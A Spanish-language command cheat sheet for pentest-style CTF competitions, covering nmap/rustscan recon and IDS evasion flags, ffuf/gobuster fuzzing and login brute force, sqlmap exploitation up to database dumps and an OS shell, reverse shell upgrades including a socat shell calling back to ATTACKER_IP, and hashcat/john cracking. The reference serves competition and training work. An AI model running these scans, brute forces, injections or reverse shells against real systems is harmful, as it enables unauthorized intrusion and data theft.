Pentest / CTF Reference

Comandos para la competencia

Recon, fuzzing, explotación y cracking en un solo lugar. Cada bloque de código tiene un botón para copiar. Ajustá IP, wordlists y puertos según el objetivo.

Recon & escaneo de puertos

nmap / rustscan

Encontrar hosts vivos, puertos abiertos y qué corre en cada uno. Regla general: rustscan para barrer rápido, nmap para profundizar — no compiten, se complementan.

Descubrimiento de hosts

nmapPing sweep en una red
nmap -sn 10.10.10.0/24
FlujoEl clásico de 3 pasos: (1) barrer todos los puertos rápido, (2) -sC -sV solo sobre esos puertos, (3) scripts de vulnerabilidades sobre esos puertos. rustscan reemplaza el paso 1 y puede encadenar los otros dos pasándole flags de nmap después de --.

Paso 1 — todos los puertos

nmapSYN scan completo, greppable
nmap -p- -sS --min-rate 5000 -vvv -n  -oG allPorts
rustscanMismo resultado, mucho más rápido (rustscan descubre, nmap verifica y formatea)
rustscan -a  --ulimit 5000 -- -sS -vvv -n -oG allPorts

Paso 2 — servicios y versión sobre esos puertos

nmapScripts default + detección de versión
nmap -sC -sV -p  -oN targeted
rustscanDescubre puertos y corre -sC -sV en un solo comando
rustscan -a  --ulimit 5000 -- -sC -sV -oN targeted

Paso 3 — scripts de vulnerabilidades

nmapVuln scripts filtrados por los que son seguros
nmap -p --script="vuln and safe"  -oN vulnSafeScan
rustscanMismo scan, encadenado desde el descubrimiento
rustscan -a  --ulimit 5000 -- --script="vuln and safe" -oN vulnSafeScan

Otras combinaciones de scripts NSE

Las categorías se pueden combinar con and / or / not. Cuanto más agresivo el scan, más ruido y más chance de romper algo — en CTF normalmente está bien, en un pentest real hay que ir con cuidado.

vuln
todos los scripts de detección de vulns (más lento y ruidoso que "vuln and safe")
vuln and safe
solo los de vuln que no deberían romper nada — el que ya usás
default or vuln
corre los scripts default (-sC) y los de vuln juntos, en una sola pasada
auth
prueba credenciales default y bypass de autenticación
discovery
enumera de más: shares, usuarios, bases de datos, configuración
exploit
intenta explotar activamente lo que encuentra — agresivo, puede tumbar el servicio
brute
fuerza bruta de credenciales vía NSE — lento y ruidoso
intrusive
scripts que pueden afectar estabilidad/performance del target
malware
busca backdoors o malware instalado en el servicio
nmapEjemplo: default + vuln combinados
nmap -p --script="default or vuln"  -oN defaultVuln
nmapEjemplo: vuln evitando los más invasivos
nmap -p --script="vuln and not intrusive"  -oN vulnCareful
nmapFamilia de scripts puntual por wildcard (ej: http)
nmap -p80,443 --script="http-vuln*"  -oN httpVuln
nmapScript puntual (ej: shares SMB)
nmap --script smb-enum-shares,smb-enum-users -p445

UDP

nmapTop puertos UDP
nmap -sU --top-ports 100 -T4
-vvv
verbosidad máxima — vas viendo puertos abiertos en tiempo real
-n
no resuelve DNS, arranca más rápido
-Pn
no hacer ping antes (asume host up) — útil si bloquean ICMP
-oG / -oN / -oA
greppable / normal / los 3 formatos (.nmap .gnmap .xml)
-A
OS detection + versiones + scripts + traceroute, todo junto (más lento y ruidoso)
-f / --mtu
fragmenta paquetes para evadir IDS/firewalls básicos
-D RND:10
decoy scan, oculta tu IP entre 10 IPs señuelo
--source-port 53
fuerza puerto de origen (bypass de reglas de firewall laxas)
rustscan -b
tamaño de batch de sockets (default 4500, bajalo si se cuelga)
rustscan --
todo lo que va después se pasa tal cual a nmap

Fuzzing web

gobuster / ffuf

Directorios, vhosts, subdominios y parámetros — organizado por lo que querés lograr, no por herramienta.

DefaultUsá ffuf — es más rápido y cubre todos los casos de abajo. gobuster queda como plan B simple si ffuf no está instalado.

Equivalencias de flags

Accióngobusterffuf
Whitelist de status codes-s 200,301-mc 200,301
Blacklist de status codes-b 404,403-fc 404,403
Filtrar por tamaño de respuesta--exclude-length N-fs N
Extensiones-x php,txt-e .php,.txt
Threads-t 50-t 50
Header / cookie-H "K: V"-H "K: V"
Ignorar TLS self-signed-k-k
Guardar resultados-o archivo-o archivo -of json

Directorios y archivos

ffufCon extensiones y filtro de tamaño
ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.html,.txt -t 50 -mc 200,204,301,302,307,401 -fs 1234
ffufRecursivo (baja a subcarpetas encontradas)
ffuf -u http://target/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -e .php
gobusterEquivalente con blacklist de códigos
gobuster dir -u http://target -w wordlist.txt -x php,html,txt -t 50 -b 404,403

Vhosts

ffufFuzzing por header Host
ffuf -u http://target -H "Host: FUZZ.target.com" -w subdomains.txt -fs
gobusterModo vhost dedicado, con filtro de falsos positivos
gobuster vhost -u http://target.com -w subdomains.txt --append-domain --exclude-length 1234

DNS / subdominios

Para esto ffuf no es lo natural (necesitarías resolver DNS por tu cuenta). Usá gobuster dns, o herramientas dedicadas como amass/subfinder si están disponibles.
gobusterEnumeración de subdominios con IPs
gobuster dns -d target.com -w subdomains.txt -t 50 -i

Parámetros, POST y login bruteforce

gobuster no tiene modo para esto — acá siempre ffuf.
ffufFuerza bruta de login (POST)
ffuf -u http://target/login -X POST -d "user=admin&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w passwords.txt -fc 401
ffufDos wordlists en simultáneo (usuario + contraseña)
ffuf -u http://target/login -X POST -d "user=FUZZ1&pass=FUZZ2" -w users.txt:FUZZ1 -w passwords.txt:FUZZ2 -fc 401

Otros flags útiles

ffuf -mw / -fw
match / filter por cantidad de palabras
ffuf -ml / -fl
match / filter por cantidad de líneas
ffuf -rate
límite de requests por segundo
ffuf -c
output coloreado en terminal
gobuster -r
seguir redirects (dir mode)
gobuster -a
User-Agent custom
gobuster -i
(dns) muestra IPs resueltas junto al subdominio

sqlmap

explotación / SQLi

Detección y explotación automática de SQL injection.

Test básico sobre un parámetro GET
sqlmap -u "http://target/page.php?id=1" --batch
Con cookie de sesión
sqlmap -u "http://target/page.php?id=1" --cookie="PHPSESSID=abc123" --batch
Petición POST con datos
sqlmap -u "http://target/login.php" --data="user=a&pass=b" --batch
Desde un request capturado en Burp
sqlmap -r request.txt --batch --level=5 --risk=3
Enumerar bases de datos → tablas → dump
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" -D nombre_db --tables
sqlmap -u "http://target/page.php?id=1" -D nombre_db -T usuarios --dump
Shell del sistema operativo
sqlmap -u "http://target/page.php?id=1" --os-shell
Detectar formularios de toda la página
sqlmap -u "http://target/" --forms --batch
--batch
no pregunta nada, usa defaults (imprescindible para automatizar)
--level=1-5
cuántos puntos de inyección prueba (headers, cookies, etc.)
--risk=1-3
qué tan agresivos son los payloads (3 puede dañar datos)
--dbms=mysql
fuerza el motor de base de datos (evita fingerprinting)
--tamper=space2comment
ofusca el payload para evadir WAF (hay decenas de scripts)
--current-user / --current-db
info rápida sin enumerar todo
--dump-all
dump de todo lo accesible (lento, usar con cuidado)

Upgrade de reverse shell

post-explotación

Convertir una shell básica (netcat, sin TTY) en una interactiva completa: autocompletado, Ctrl+C que no mata la shell, editores como vim/nano funcionando.

Método estándar (Python PTY + stty raw)

  1. En la shell que recibiste, spawneá una PTY real:
    Python3 (o python2 si no hay python3)
    python3 -c 'import pty; pty.spawn("/bin/bash")'
  2. Background la shell con Ctrl+Z (volvés a tu terminal local).
  3. En tu terminal (atacante), poné la TTY local en modo raw y volvé al foreground:
    En tu máquina, antes de "fg"
    stty raw -echo; fg
    Después de esto tenés que apretar Enter una o dos veces.
  4. Ya en la shell remota, seteá el entorno:
    Dentro de la shell remota
    export TERM=xterm
export SHELL=bash
  5. Igualá el tamaño de la TTY al de tu terminal real. En otra pestaña local corré stty size (te da "filas columnas") y en la shell remota:
    Ajustar tamaño (ejemplo: 52 filas, 235 columnas)
    stty rows 52 columns 235

Alternativa: socat (TTY completa desde el inicio)

Listener en tu máquina
socat file:`tty`,raw,echo=0 tcp-listen:4444
Conexión desde la víctima
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

Extras útiles

Listener con rlwrap (historial, flechas, autocompletado local)
rlwrap nc -lvnp 4444
Alternativa a python pty si no está disponible
script -qc /bin/bash /dev/null
TipSi no hay python en el target, probá which python python3 perl php ruby lua — casi todos tienen alguna forma de spawnear una pty.

Cracking de hashes

hashcat / john

hashcat para GPU — mucho más rápido con diccionarios grandes. John para CPU y para extraer el hash de archivos protegidos (zip, rar, ssh, /etc/shadow) con sus scripts *2john.

Identificar el hash

hashcatAutodetectar tipo de hash
hashcat --identify hash.txt

Ataque de diccionario

hashcatCon GPU (más rápido en diccionarios grandes)
hashcat -m  -a 0 hash.txt rockyou.txt
johnSin GPU disponible
john --wordlist=rockyou.txt hash.txt
johnForzar formato (cuando no lo detecta bien)
john --format=NT --wordlist=rockyou.txt hash.txt

Reglas y máscaras

hashcatDiccionario + reglas (muta cada palabra)
hashcat -m  -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcatAtaque por máscara (bruteforce con patrón)
hashcat -m  -a 3 hash.txt ?u?l?l?l?l?d?d?d
johnCon reglas de mutación
john --wordlist=rockyou.txt --rules=Jumbo hash.txt

Formatos especiales / extracción de hash

johnCombinar /etc/passwd y /etc/shadow
unshadow passwd.txt shadow.txt > combined.txt
john --wordlist=rockyou.txt combined.txt
johnExtraer hash de archivos protegidos
zip2john archivo.zip > zip.hash
rar2john archivo.rar > rar.hash
ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt zip.hash

Ver resultados

hashcatContraseñas ya crackeadas (potfile)
hashcat -m  hash.txt --show
johnContraseñas ya crackeadas
john --show hash.txt

Wordlists — cuál usar en cada caso

SecLists / rockyou

La mayoría vive en /usr/share/seclists (si no está: sudo apt install seclists o clonar github.com/danielmiessler/SecLists) y /usr/share/wordlists en Kali.

EstrategiaEmpezá siempre con una lista chica o mediana — en competencia el tiempo importa más que la cobertura. Escalá a la versión grande solo si no encontraste nada y te sobra tiempo.

Directorios y archivos

dirb/common.txt
rápido, para descubrir lo obvio en segundos
Discovery/Web-Content/raft-medium-directories.txt
buen balance cobertura/tiempo — la que uso por default
Discovery/Web-Content/raft-large-directories.txt
exhaustiva, cuando la mediana no dio nada y hay tiempo
Discovery/Web-Content/raft-medium-files.txt
archivos con extensión conocida — combinar con -x/-e
Discovery/Web-Content/big.txt
alternativa grande de propósito general

Subdominios y vhosts

Discovery/DNS/subdomains-top1million-5000.txt
primer intento, rápido
Discovery/DNS/subdomains-top1million-110000.txt
a fondo, cuando el corto no alcanza

Parámetros y campos ocultos

Discovery/Web-Content/burp-parameter-names.txt
nombres de parámetros comunes para fuzzing de GET/POST

Usuarios y contraseñas

Usernames/top-usernames-shortlist.txt
usuarios comunes, primer intento en login bruteforce
Usernames/xato-net-10-million-usernames.txt
a fondo, cuando el shortlist no funcionó
/usr/share/wordlists/rockyou.txt
el default de facto para passwords (gunzip si viene comprimido)
Passwords/Common-Credentials/10k-most-common.txt
passwords rápido, antes de ir directo a rockyou
Passwords/Default-Credentials/
usuario:contraseña de fábrica para paneles admin, routers, IoT

Cracking (hashcat / john)

rockyou.txt + best64.rule
combinación estándar para arrancar cualquier cracking de hashes
Passwords/probable-v2-top1575.txt
passwords "probables" chico, para pruebas rápidas antes de ir a rockyou

Referencias online

consulta durante la compe

Para cuando no te acordás la técnica exacta o el payload — dejalas abiertas en pestañas aparte.

HackTricks

La wiki más completa de técnicas de pentest: web, red, cloud, Active Directory, privesc en Linux y Windows. El primer lugar para buscar cualquier técnica.

Exploit Notes

Cheatsheets cortos y al grano por herramienta/tecnología — más rápido de escanear que HackTricks cuando ya sabés qué buscás.

GTFOBins

Binarios Unix que se pueden abusar para bypass de restricciones locales — privesc, escape de shells restringidas, lectura de archivos.

LOLBAS

El equivalente a GTFOBins pero para Windows: binarios legítimos del sistema que sirven para privesc o evasión.

CyberChef

"Cyber swiss army knife" — encode/decode, hashing, cifrado, análisis de bytes, todo encadenable desde el navegador. Clave en challenges de crypto/forense.

PayloadsAllTheThings

Repositorio gigante de payloads organizados por tipo de vulnerabilidad (SQLi, XSS, SSRF, XXE, deserialización, etc).

revshells.com

Generador de one-liners de reverse shell para el lenguaje/intérprete que tengas disponible en el target.

WADComs

Equivalente a GTFOBins para comandos ofensivos contra Active Directory / Windows.

Otras herramientas que conviene tener a mano

bonus

No entraban en el pedido original pero suelen aparecer en cualquier CTF de estilo pentest.

netcat / ncat

Listener de reverse shells (nc -lvnp 4444), banner grabbing, transferencia de archivos.

hydra

Fuerza bruta de login contra SSH, FTP, HTTP forms, RDP, etc. hydra -l admin -P pass.txt ssh://IP

feroxbuster

Alternativa a gobuster para content discovery, con recursividad más agresiva por defecto.

searchsploit

Búsqueda offline en Exploit-DB. searchsploit apache 2.4.49

msfvenom / msfconsole

Generación de payloads y framework de explotación (Metasploit).

enum4linux-ng / smbclient / smbmap

Enumeración de SMB: shares, usuarios, política de passwords.

crackmapexec / netexec

Enumeración y spray de credenciales masivo en entornos Windows/AD.

impacket suite

secretsdump.py, psexec.py, GetUserSPNs.py — explotación y post-explotación en AD.

linpeas.sh / winpeas

Enumeración automática para escalada de privilegios local.

pspy

Monitorea procesos en Linux sin necesitar root — útil para pillar cron jobs.

chisel / ligolo-ng

Pivoting y tunneling a través de una máquina comprometida.

responder

Poisoning de LLMNR/NBT-NS/mDNS para capturar hashes NetNTLM en redes Windows.

BloodHound + SharpHound

Mapea rutas de ataque en Active Directory de forma visual.

wpscan / nikto

Escaneo de vulnerabilidades específico de WordPress y escaneo web genérico.

Burp Suite

Proxy de intercepción — imprescindible para modificar requests antes de tirárselas a sqlmap/ffuf.

SecLists

Colección de wordlists de referencia, normalmente en /usr/share/seclists.
